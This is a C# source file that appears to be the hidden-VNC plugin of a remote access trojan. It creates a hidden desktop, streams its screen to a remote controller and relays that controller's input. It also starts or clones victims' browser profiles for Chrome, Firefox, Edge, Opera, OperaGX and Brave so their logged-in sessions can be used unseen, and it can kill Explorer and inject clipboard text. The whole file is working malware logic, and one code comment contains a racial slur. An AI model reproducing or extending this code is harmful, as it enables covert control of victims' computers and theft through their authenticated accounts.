

using InvokedCommon.Enums;
using InvokedCommon.Messages;
using InvokedCommon.Networking;
using InvokedCommon.Structs;
using InvokedCommon.Video;
using InvokedCommon.Video.Codecs;
using Plugin.Helper;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace Plugin.MessageHandlers
{
	public class PluginHVNCHandler : IMessageProcessor, IDisposable
	{
		private UnsafeStreamCodec _streamCodec;
		public Client _client;
		private int _sentFramesCount;
		private bool _sentCheckServerRequest;
		private readonly object _streamcodecLock = new object();
		public static bool Active;
		private bool has_clonned_chrome;
		private bool has_clonned_firefox;
		private bool has_clonned_edge;
		private bool has_clonned_opera;
		private bool has_clonned_operagx;
		private bool has_clonned_brave;
		private Imaging_handler ImageHandler;
		private input_handler InputHandler;
		private Process_Handler ProcessHandler;

		public bool CanExecute(IMessage message)
		{
			switch (message)
			{
				case GetDesktopHVNC _:
				case DoInputEventHVNC _:
				case DoNewProcessHVNC _:
				case DoOptionHVNC _:
					return true;
				default:
					return message is SetHVNCStatus;
			}
		}

		public bool CanExecuteFrom(ISender sender) => true;

		public void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case GetDesktopHVNC message1:
					this.Execute(sender, message1);
					break;
				case DoInputEventHVNC message2:
					this.Execute(sender, message2);
					break;
				case DoNewProcessHVNC message3:
					this.Execute(sender, message3);
					break;
				case DoOptionHVNC message4:
					this.Execute(sender, message4);
					break;
				case SetHVNCStatus message5:
					this.Execute(sender, message5);
					break;
			}
		}

		[DllImport("SHCore.dll", SetLastError = true)]
		public static extern int SetProcessDpiAwareness(int awareness);

		public void StartHVNC()
		{
			string DesktopName = "Sam";
			this.ImageHandler = new Imaging_handler(DesktopName);
			this.InputHandler = new input_handler(DesktopName);
			this.ProcessHandler = new Process_Handler(DesktopName);
		}

		public void Execute(ISender client, SetHVNCStatus message)
		{
			if (message.Status != HVNCStatus.ResetClientFrameCount)
				return;
			this._sentFramesCount = 0;
			this._sentCheckServerRequest = false;
		}

		public static Rectangle GetBounds(int screenNumber) => Screen.AllScreens[screenNumber].Bounds;

		private void StopHVNC(ISender client)
		{
			PluginHVNCHandler.Active = false;
			this._sentFramesCount = 0;
			this._sentCheckServerRequest = false;
			try
			{
				client.Send<GetDesktopResponseHVNC>(new GetDesktopResponseHVNC()
				{
					Image = (byte[]) null,
					Quality = this._streamCodec.ImageQuality,
					Resolution = this._streamCodec.Resolution,
					HvncStatus = HVNCStatus.Stopped
				});
			}
			catch
			{
			}
		}

		private void Execute(ISender client, GetDesktopHVNC message)
		{
			if (message.HvncStatus == HVNCStatus.Stop)
				this.StopHVNC(client);
			if (message.HvncStatus != HVNCStatus.Start)
				return;
			this._sentFramesCount = 0;
			this._sentCheckServerRequest = false;
			this._client = (Client) client;
			if (PluginHVNCHandler.Active)
				return;
			if (message.CreateNew)
				this.StartHVNC();
			lock (this._streamcodecLock)
			{
				PluginHVNCHandler.Active = true;
				Rectangle bounds = PluginHVNCHandler.GetBounds(0);
				Resolution resolution = new Resolution()
				{
					Height = bounds.Height,
					Width = bounds.Width
				};
				this._streamCodec?.Dispose();
				this._streamCodec = new UnsafeStreamCodec(message.Quality, 0, resolution);
				new Thread((ThreadStart) (() => this.HVNCCaptureAndSend())).Start();
			}
		}

		private void CaptureSendHVNCFrame(
			BitmapData desktopData,
			Bitmap desktop,
			object streamcodecLock)
		{
			try
			{
				HVNCScreenshotInfoHolder screenshotInfoHolder = this.ImageHandler.Screenshot();
				desktop = screenshotInfoHolder.Image;
				desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height), ImageLockMode.ReadWrite, desktop.PixelFormat);
				using (MemoryStream outStream = new MemoryStream())
				{
					streamcodecLock = this._streamcodecLock;
					lock (streamcodecLock)
					{
						if (this._streamCodec == null)
							throw new Exception("StreamCodec can not be null.");
						this._streamCodec.CodeImage(desktopData.Scan0, new Rectangle(0, 0, desktop.Width, desktop.Height), new Size(desktop.Width, desktop.Height), desktop.PixelFormat, (Stream) outStream);
						if (this._client == null)
						{
							PluginHVNCHandler.Active = false;
						}
						else
						{
							this._client.Send<GetDesktopResponseHVNC>(new GetDesktopResponseHVNC()
							{
								Image = outStream.ToArray(),
								Quality = this._streamCodec.ImageQuality,
								Resolution = this._streamCodec.Resolution,
								WindowCount = screenshotInfoHolder.ScreenshotWindowCount
							});
							++this._sentFramesCount;
						}
					}
				}
			}
			catch (Exception ex)
			{
				streamcodecLock = this._streamcodecLock;
				lock (streamcodecLock)
				{
					this._streamCodec?.Dispose();
					this._streamCodec = (UnsafeStreamCodec) null;
				}
			}
			finally
			{
				if (desktop != null)
				{
					if (desktopData != null)
					{
						try
						{
							desktop.UnlockBits(desktopData);
						}
						catch
						{
						}
					}
					desktop.Dispose();
				}
			}
		}

		private void HVNCCaptureAndSend()
		{
			BitmapData desktopData = (BitmapData) null;
			Bitmap desktop = (Bitmap) null;
			object streamcodecLock = (object) null;
			Thread.Sleep(1);
label_5:
			while (PluginHVNCHandler.Active && this._client != null && this._client.Connected)
			{
				this.CaptureSendHVNCFrame(desktopData, desktop, streamcodecLock);
				if (this._sentFramesCount > 200 && !this._sentCheckServerRequest)
				{
					this._client.Send<SetHVNCStatus>(new SetHVNCStatus()
					{
						Status = HVNCStatus.CheckServer
					});
					this._sentCheckServerRequest = true;
				}
				while (true)
				{
					if (this._sentFramesCount > 300 && PluginHVNCHandler.Active && this._client != null && this._client.Connected)
						Thread.Sleep(1);
					else
						goto label_5;
				}
			}
			PluginHVNCHandler.Active = false;
			lock (this._streamcodecLock)
			{
				this._streamCodec?.Dispose();
				this._streamCodec = (UnsafeStreamCodec) null;
			}
		}

		private void Execute(ISender client, DoInputEventHVNC message)
		{
			this.InputHandler.Input((uint) message.HVNCImsg, (IntPtr) message.HVNCIwParam, (IntPtr) message.HVNCIlParam);
		}

		private void Execute(ISender client, DoNewProcessHVNC message)
		{
			if (!string.IsNullOrEmpty(message.ProcessPath))
			{
				this.ProcessHandler.CreateProc(message.ProcessPath);
			}
			else
			{
				string presetProcess = message.PresetProcess;
                uint hash = 2166136261U;
				for (int i = 0; i < presetProcess.Length; i++)
				{
					hash = ((uint)presetProcess[i] ^ hash) * 16777619U;
				} // what the fuck nigga
                switch (hash)
				{
					case 163046882:
						if (!(presetProcess == "StartNewProfileBrave"))
							break;
						if (message.CloneBrowser)
						{
							this.has_clonned_brave = true;
							this.ProcessHandler.HandleCloneBrave();
							break;
						}
						this.ProcessHandler.StartNewProfileBrave();
						break;
					case 362263472:
						if (!(presetProcess == "StartExplorer"))
							break;
						this.ProcessHandler.StartExplorer();
						break;
					case 985005349:
						if (!(presetProcess == "StartNewProfileEdge"))
							break;
						if (message.CloneBrowser)
						{
							this.has_clonned_edge = true;
							this.ProcessHandler.HandleCloneEdge();
							break;
						}
						this.ProcessHandler.StartNewProfileEdge();
						break;
					case 1363749253:
						if (!(presetProcess == "StartOperaGX"))
							break;
						this.ProcessHandler.StartOperaGX();
						break;
					case 1532431521:
						if (!(presetProcess == "StartChrome"))
							break;
						this.ProcessHandler.StartChrome();
						break;
					case 1969412199:
						if (!(presetProcess == "StartNewProfileOpera"))
							break;
						if (message.CloneBrowser)
						{
							this.has_clonned_opera = true;
							this.ProcessHandler.HandleCloneOpera();
							break;
						}
						this.ProcessHandler.StartNewProfileOpera();
						break;
					case 2080965466:
						if (!(presetProcess == "StartNewProfileChrome"))
							break;
						if (message.CloneBrowser)
						{
							this.has_clonned_chrome = true;
							Task.Run((Func<Task>) (() => this.ProcessHandler.HandleCloneChrome()));
							break;
						}
						this.ProcessHandler.StartNewProfileChrome();
						break;
					case 2294916648:
						if (!(presetProcess == "StartNewProfileOperaGX"))
							break;
						if (message.CloneBrowser)
						{
							this.has_clonned_operagx = true;
							this.ProcessHandler.HandleCloneOperaGX();
							break;
						}
						this.ProcessHandler.StartNewProfileOperaGX();
						break;
					case 2471068496:
						if (!(presetProcess == "StartFirefox"))
							break;
						this.ProcessHandler.StartFirefox();
						break;
					case 2848706393:
						if (!(presetProcess == "StartNewProfileFirefox"))
							break;
						if (message.CloneBrowser)
						{
							this.has_clonned_firefox = true;
							this.ProcessHandler.HandleCloneFirefox();
							break;
						}
						this.ProcessHandler.StartNewProfileFirefox();
						break;
					case 3608517946:
						if (!(presetProcess == "StartEdge"))
							break;
						this.ProcessHandler.StartEdge();
						break;
					case 3767062594:
						if (!(presetProcess == "StartOpera"))
							break;
						this.ProcessHandler.StartOpera();
						break;
					case 4159272515:
						if (!(presetProcess == "StartBrave"))
							break;
						this.ProcessHandler.StartBrave();
						break;
				}
			}
		}

		private void Execute(ISender client, DoOptionHVNC message)
		{
			if (this.InputHandler == null || this.ProcessHandler == null || this.ImageHandler == null)
				return;
			switch (message.options)
			{
				case HvncOptions.ResetAllWindows:
					this.InputHandler.ResetWindowsTopDown(IntPtr.Zero);
					break;
				case HvncOptions.KillExplorer:
					this.ProcessHandler.KillExplorer();
					break;
				case HvncOptions.PasteClipboard:
					if (string.IsNullOrEmpty(message.data))
						break;
					this.InputHandler.PasteText(message.data);
					break;
				case HvncOptions.PasteClientClipboard:
					this.InputHandler.PasteFromClientClipboard();
					break;
				case HvncOptions.FixOpera:
					OperaHVNC.PatchOpera();
					break;
			}
		}

		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize((object) this);
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposing)
				return;
			this.ImageHandler?.Dispose();
			this.InputHandler?.Dispose();
			this.ProcessHandler?.Dispose();
			this._streamCodec?.Dispose();
			GC.Collect();
		}
	}
}
